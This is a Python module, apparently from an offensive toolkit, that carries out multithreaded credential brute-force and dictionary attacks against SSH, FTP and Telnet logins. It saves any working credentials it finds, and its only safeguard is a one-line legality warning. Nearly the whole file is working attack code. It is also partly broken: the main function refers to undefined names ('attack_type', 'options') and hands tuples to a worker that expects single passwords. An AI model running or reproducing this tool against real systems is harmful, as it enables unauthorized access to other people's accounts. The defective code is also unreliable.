import threading
import time
import queue
import itertools
import string
import paramiko
import ftplib
import asyncio
import telnetlib3
import socket
from tqdm import tqdm
from . import utils

# --- Global State ---
found_credentials = None
stop_event = threading.Event()

# --- Connection Functions ---
# Each function now accepts a timeout and is designed to fail gracefully.

def _try_ssh(target, port, username, password, timeout):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(target, port=port, username=username, password=password, timeout=timeout, banner_timeout=timeout)
        return True
    except paramiko.AuthenticationException:
        return False # Correct password would not raise this
    except Exception:
        return False # Any other error (timeout, connection refused) is a failure
    finally:
        client.close()

def _try_ftp(target, port, username, password, timeout):
    try:
        with ftplib.FTP(timeout=timeout) as ftp:
            ftp.connect(target, port)
            ftp.login(username, password)
            ftp.quit()
            return True
    except (ftplib.error_perm, ftplib.error_temp, socket.timeout, ConnectionRefusedError, OSError):
        return False

async def _try_telnet_async(target, port, username, password, timeout):
    try:
        reader, writer = await telnetlib3.open_connection(target, port, shell=False, timeout=timeout)
        await reader.readuntil(b"login:", timeout=2)
        writer.write(username.encode('ascii') + b'\n')
        await reader.readuntil(b"Password:", timeout=2)
        writer.write(password.encode('ascii') + b'\n')
        result = await reader.read(1024)
        writer.close()
        return b"incorrect" not in result.lower()
    except (asyncio.TimeoutError, ConnectionRefusedError, OSError):
        return False

def _try_telnet(target, port, username, password, timeout):
    return asyncio.run(_try_telnet_async(target, port, username, password, timeout))

# --- Worker & Setup ---

SUPPORTED_SERVICES = {
    'ssh': _try_ssh,
    'ftp': _try_ftp,
    'telnet': _try_telnet,
}

def _bruteforce_worker(q, pbar, service_func, target, port, username, timeout, verbose):
    """Picks a password from the queue and tests it against a single username."""
    while not stop_event.is_set():
        try:
            password = q.get_nowait()
        except queue.Empty:
            return

        if verbose:
            tqdm.write(f"[VERBOSE] Testing: {username}:{password}")

        try:
            if service_func(target, port, username, password, timeout):
                global found_credentials
                found_credentials = (username, password)
                stop_event.set()
                tqdm.write(f"\n[+] SUCCESS! Credentials found: {username}:{password}")
        finally:
            pbar.update(1)
            q.task_done()

def _dictionary_worker(q, pbar, service_func, target, port, timeout, verbose):
    """Picks (username, password) from the queue and tests them."""
    while not stop_event.is_set():
        try:
            username, password = q.get_nowait()
        except queue.Empty:
            return

        if verbose:
            tqdm.write(f"[VERBOSE] Testing: {username}:{password}")

        try:
            if service_func(target, port, username, password, timeout):
                global found_credentials
                found_credentials = (username, password)
                stop_event.set()
                tqdm.write(f"\n[+] SUCCESS! Credentials found: {username}:{password}")
        finally:
            pbar.update(1)
            q.task_done()

# --- Password Generation ---

def get_charset(charset_name):
    charsets = {
        'alphanum': string.ascii_letters + string.digits,
        'alpha': string.ascii_letters,
        'lower': string.ascii_lowercase,
        'upper': string.ascii_uppercase,
        'digits': string.digits,
        'all': string.ascii_letters + string.digits + string.punctuation
    }
    return charsets.get(charset_name, charset_name)

def generate_passwords(charset, min_len, max_len):
    actual_charset = get_charset(charset)
    for length in range(min_len, max_len + 1):
        for p in itertools.product(actual_charset, repeat=length):
            if stop_event.is_set(): return
            yield ''.join(p)

# --- Main Runner Function ---

def run(target, port, service, userlist, passlist, threads=50, timeout=5, verbose=False):
    """Main function to run the professional bruteforce attack."""
    try:
        port = int(port)
    except ValueError:
        utils.log_message('-', "Le port doit être un nombre entier.")
        return
    global found_credentials, stop_event
    found_credentials = None
    stop_event.clear()

    service_func = SUPPORTED_SERVICES.get(service)
    if not service_func:
        utils.log_message('-', f"Service '{service}' is not supported.")
        return None

    utils.log_message('!', "Bruteforcing without authorization is illegal.")
    utils.log_message('*', f"Starting dictionary attack on {target}:{port} ({service.upper()}) with {threads} threads.")

    credential_queue = queue.Queue()
    total_combinations = 0

    try:
        with open(userlist, 'r', errors='ignore') as f_users:
            users = [line.strip() for line in f_users if line.strip()]
        with open(passlist, 'r', errors='ignore') as f_pass:
            passwords = [line.strip() for line in f_pass if line.strip()]

        for user in users:
            for password in passwords:
                credential_queue.put((user, password))
        total_combinations = len(users) * len(passwords)

    except (FileNotFoundError, KeyError, ValueError) as e:
        utils.log_message('-', f"Configuration error: {e}")
        return None

    if total_combinations == 0:
        utils.log_message('-', "No username/password combinations to test.")
        return None

    # --- Setup and run threads ---
    start_time = time.time()
    worker_threads = []
    
    if attack_type == 'dictionary':
        pbar = tqdm(total=total_combinations, desc="Dictionary Attack", unit="creds")
        for _ in range(threads):
            thread = threading.Thread(target=_dictionary_worker, args=(credential_queue, pbar, service_func, target, port, timeout, verbose), daemon=True)
            thread.daemon = True
            thread.start()
            worker_threads.append(thread)
    elif attack_type == 'bruteforce':
        pbar = tqdm(total=total_combinations, desc="Bruteforcing", unit="pass")
        for _ in range(threads):
            thread = threading.Thread(target=_bruteforce_worker, args=(credential_queue, pbar, service_func, target, port, options['username'], timeout, verbose), daemon=True)
            thread.daemon = True
            thread.start()
            worker_threads.append(thread)

    try:
        credential_queue.join()
    except (KeyboardInterrupt, SystemExit):
        tqdm.write("\n[!] Attack interrupted by user. Stopping threads...")
        stop_event.set()

    for thread in worker_threads:
        thread.join()

    pbar.close()
    end_time = time.time()
    utils.log_message('*', f"Attack finished in {end_time - start_time:.2f} seconds.")

    if found_credentials:
        utils.log_message('+', f"Credentials found: {found_credentials[0]}:{found_credentials[1]}")
        with open("outputs/bruteforce_credentials.txt", "a") as f:
            f.write(f"{target}:{port} ({service}) - {found_credentials[0]}:{found_credentials[1]}\n")
    else:
        utils.log_message('-', "No valid credentials found with the given parameters.")

    return found_credentials
